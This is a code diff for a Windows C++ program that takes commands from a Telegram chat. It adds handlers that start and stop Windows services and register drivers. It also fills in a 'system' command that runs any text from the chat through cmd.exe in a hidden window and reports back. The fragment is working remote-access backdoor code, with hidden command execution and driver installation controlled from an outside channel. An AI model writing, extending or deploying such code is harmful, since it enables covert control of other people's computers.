@@ -256,8 +256,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 						}
 					}
 
-					//    0     1     2          3                     4                         5            6
-					// service add [Name] [DisplayName] [C:\\ProgramData\\yourdriver.sys] [Type-Driver] [Start-Type] 
+					//  1     2          3                     4                         5            6
+					// add [Name] [DisplayName] [C:\\ProgramData\\yourdriver.sys] [Type-Driver] [Start-Type] 
 					else if (params[1] == "add") {
 						DWORD Type = ParseTypeDriver(params[5]);
 						DWORD StartType = ParseStartTypeDriver(params[6]);
@@ -266,7 +266,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 							api.SendTextMessage(s.chatid, "Error! Service not added");
 						}
 						else {
-							if (AddService(params[2], params[3], params[4], Type, StartType)) {
+							if (AddSvc(params[2], params[3], params[4], Type, StartType)) {
 								api.SendTextMessage(s.chatid, "Success! Service has been added");
 							}
 							else {
@@ -275,7 +275,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 						}
 					}
 
-					//          2
+					//    1      2
 					// delete [Name]
 					else if (params[1] == "delete") {
 						if (DeleteSvc(params[2])) {
@@ -283,6 +283,28 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 						}
 						else {
 							api.SendTextMessage(s.chatid, "Error! Service not deleted");
+						}
+					}
+
+					//  1      2
+					// start [Name]
+					else if (params[1] == "start") {
+						if (StartSvc(params[2])) {
+							api.SendTextMessage(s.chatid, "Success! Service has been started");
+						}
+						else {
+							api.SendTextMessage(s.chatid, "Error! Service not started");
+						}
+					}
+
+					// 1      2
+					// stop [Name]
+					else if (params[1] == "stop") {
+						if (StopSvc(params[2])) {
+							api.SendTextMessage(s.chatid, "Success! Service has been stopped");
+						}
+						else {
+							api.SendTextMessage(s.chatid, "Error! Service not stopped");
 						}
 					}
 				}
@@ -294,6 +316,14 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 					try {
 						std::string cmd = command.replace(command.find("system "), 7, "");
 
+						char windir[128] = { 0 };
+						if (GetWindowsDirectoryA(windir, sizeof(windir) - 1) != 0) {
+							ShellExecuteA(NULL, "open", std::string(std::string(windir) + "\\System32\\cmd.exe").c_str(), cmd.c_str(), 0, SW_HIDE);
+							api.SendTextMessage(s.chatid, "Success! Command is runned");
+						}
+						else {
+							api.SendTextMessage(s.chatid, "Error! Windows directory is null");
+						}
 					}
 					catch (std::exception) {
 						api.SendTextMessage(s.chatid, "Error! Recheck the parameters");
